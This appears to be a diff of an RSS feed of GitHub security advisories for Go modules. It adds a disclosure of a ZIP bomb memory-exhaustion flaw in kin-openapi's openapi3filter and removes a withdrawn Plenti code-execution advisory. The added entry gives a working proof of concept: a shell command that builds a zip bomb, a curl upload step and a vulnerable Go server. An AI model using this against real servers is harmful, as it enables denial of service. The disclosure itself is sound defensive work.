@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2025-03-19T18:01:38.057Z</updated>
+    <updated>2025-03-19T19:01:20.759Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,134 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/getkin/kin-openapi/openapi3filter] Improper Handling of Highly Compressed Data (Data Amplification) in github.com/getkin/kin-openapi/openapi3filter]]></title>
+        <id>https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</id>
+        <link href="https://github.com/advisories/GHSA-wq9g-9vfc-cfq9"/>
+        <updated>2025-03-19T18:12:54.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When validating a request with a multipart/form-data schema, if the OpenAPI schema allows it, an attacker can upload a crafted ZIP file (e.g., a ZIP bomb), causing the server to consume all available system memory.</p>
+<h3 id="details">Details</h3>
+<p>The root cause comes from the <a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523">ZipFileBodyDecoder</a>, which is registered <a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275">automatically</a> by the module (contrary to what the <a href="https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse">documentation says</a>.</p>
+<h3 id="poc">PoC</h3>
+<p>To reproduce the vulnerability, you can use the following OpenAPI schema:</p>
+<pre><code class="language-yaml">openapi: 3.0.0
+info:
+  title: 'Validator'
+  version: 0.0.1
+paths:
+  /:
+    post:
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              required:
+                - file
+              properties:
+                file:
+                  type: string
+                  format: binary
+      responses:
+        '200':
+          description: Created
+</code></pre>
+<p>And this code to validate the request (nothing fancy, it basically only calls the <code>openapi3filter.ValidateRequest</code> function`):</p>
+<pre><code class="language-go">package main
+
+import (
+    "fmt"
+    "log"
+    "net/http"
+
+    "github.com/getkin/kin-openapi/openapi3filter"
+    legacyrouter "github.com/getkin/kin-openapi/routers/legacy"
+
+    "github.com/getkin/kin-openapi/openapi3"
+)
+
+func handler(w http.ResponseWriter, r *http.Request) {
+    loader := openapi3.NewLoader()
+
+    doc, err := loader.LoadFromFile("schema.yaml")
+    if err != nil {
+        http.Error(w, "Failed to load OpenAPI document", http.StatusInternalServerError)
+        return
+    }
+
+    if err := doc.Validate(r.Context()); err != nil {
+        http.Error(w, "Invalid OpenAPI document", http.StatusBadRequest)
+        return
+    }
+
+    router, err := legacyrouter.NewRouter(doc)
+    if err != nil {
+        http.Error(w, "Failed to create router", http.StatusInternalServerError)
+        return
+    }
+
+    route, pathParams, err := router.FindRoute(r)
+    if err != nil {
+        http.Error(w, "Failed to find route", http.StatusNotFound)
+        return
+    }
+
+    input := &amp;openapi3filter.RequestValidationInput{
+        Request:     r,
+        QueryParams: r.URL.Query(),
+        Route:       route,
+        PathParams:  pathParams,
+    }
+
+    if err := openapi3filter.ValidateRequest(r.Context(), input); err != nil {
+        http.Error(w, fmt.Sprintf("Request validation failed: %v", err), http.StatusBadRequest)
+        return
+    }
+
+    w.Write([]byte("request ok !"))
+}
+
+func main() {
+    http.HandleFunc("/", handler)
+    log.Fatal(http.ListenAndServe(":8080", nil))
+
+}
+</code></pre>
+<p>We also need to create a zip bomb. This command will create a 4.7GB file and compress it to to 4.7MB zip archive:</p>
+<pre><code class="language-shell">perl -e 'print "0" x 5000000000' &gt; /tmp/bigfile.txt; zip -9 /tmp/bomb.zip /tmp/bigfile.txt
+</code></pre>
+<p>Run the PoC provided, and upload the zip bomb with <code>curl localhost:8080/  -F file="@/tmp/bomb.zip;type=application/zip" -v</code>.</p>
+<p>Observe the memory consumption of the test server during and after the upload (it jumped to a bit over 22GB in my testing, with only a 4.7MB input file, you can reduce the size of the generated file to not kill your test machine when reproducing.) </p>
+<h3 id="impact">Impact</h3>
+<p>An attacker can trigger an out-of-memory (OOM) condition, leading to server crashes or degraded performance.
+It seems to only be exploitable if the OpenAPI schema allows for multipart upload.</p>
+<h3 id="remediation">Remediation</h3>
+<p>I see at least 2 potential fixes/improvements:</p>
+<ul>
+<li>Do not register by default the zip file decoder (I honestly was a bit surprised to see it was enabled by default, it seems to be quite a niche use-case ?)</li>
+<li>Update <code>ZipFileBodyDecoder</code> to enforce a maximum size of the decompressed archive and bailout as soon as it's reached (probably with a small default value and allow the users to configure it through the input options ?)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/getkin/kin-openapi/security/advisories/GHSA-wq9g-9vfc-cfq9">https://github.com/getkin/kin-openapi/security/advisories/GHSA-wq9g-9vfc-cfq9</a></li>
+<li><a href="https://github.com/getkin/kin-openapi/pull/1059">https://github.com/getkin/kin-openapi/pull/1059</a></li>
+<li><a href="https://github.com/getkin/kin-openapi/commit/67f0b233ffc01332f7d993f79490fbea5f4455f1">https://github.com/getkin/kin-openapi/commit/67f0b233ffc01332f7d993f79490fbea5f4455f1</a></li>
+<li><a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275">https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275</a></li>
+<li><a href="https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523">https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523</a></li>
+<li><a href="https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse">https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse</a></li>
+<li><a href="https://github.com/advisories/GHSA-wq9g-9vfc-cfq9">https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wq9g-9vfc-cfq9</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-03-19T18:12:53.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/openshift/hive] Openshift Hive Exposes VCenter Credentials via ClusterProvision]]></title>
         <id>https://github.com/advisories/GHSA-c339-mwfc-fmr2</id>
@@ -634,33 +762,5 @@ Both Azure authentication providers attempt to exchange an Entra ID (EID) token 
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2025-03-12T22:06:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/plentico/plenti] Duplicate Advisory: Plenti  - Code Injection - Denial of Services]]></title>
-        <id>https://github.com/advisories/GHSA-323w-6p85-26fr</id>
-        <link href="https://github.com/advisories/GHSA-323w-6p85-26fr"/>
-        <updated>2025-03-12T21:58:26.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="duplicate-advisory">Duplicate Advisory</h1>
-<p>This advisory has been withdrawn because it is a duplicate of GHSA-mj4v-hp69-27x5. This link is maintained to preserve external references.</p>
-<h1 id="original-description">Original Description</h1>
-<p>Plenti &lt;= 0.7.16 is vulnerable to code execution. Users uploading '.svelte' files with the /postLocal endpoint can define the file name as javascript codes. The server executes the uploaded file name in host, and cause code execution.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/plentico/plenti/security/advisories/GHSA-mj4v-hp69-27x5">https://github.com/plentico/plenti/security/advisories/GHSA-mj4v-hp69-27x5</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26260">https://nvd.nist.gov/vuln/detail/CVE-2025-26260</a></li>
-<li><a href="https://ahmetakan.com/2025/02/14/cve-2025-26260">https://ahmetakan.com/2025/02/14/cve-2025-26260</a></li>
-<li><a href="https://github.com/ahmetak4n/vulnerability-playground/tree/main/vulnerability-research/CVE-2025-26260">https://github.com/ahmetak4n/vulnerability-playground/tree/main/vulnerability-research/CVE-2025-26260</a></li>
-<li><a href="https://github.com/plentico/plenti/releases/tag/v0.7.17">https://github.com/plentico/plenti/releases/tag/v0.7.17</a></li>
-<li><a href="https://github.com/plentico/plenti/commit/c3e72a9ebbc2a03f4b0f3104becbfc25e390cb8e">https://github.com/plentico/plenti/commit/c3e72a9ebbc2a03f4b0f3104becbfc25e390cb8e</a></li>
-<li><a href="https://github.com/advisories/GHSA-323w-6p85-26fr">https://github.com/advisories/GHSA-323w-6p85-26fr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-323w-6p85-26fr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-03-12T18:32:53.000Z</published>
     </entry>
 </feed>
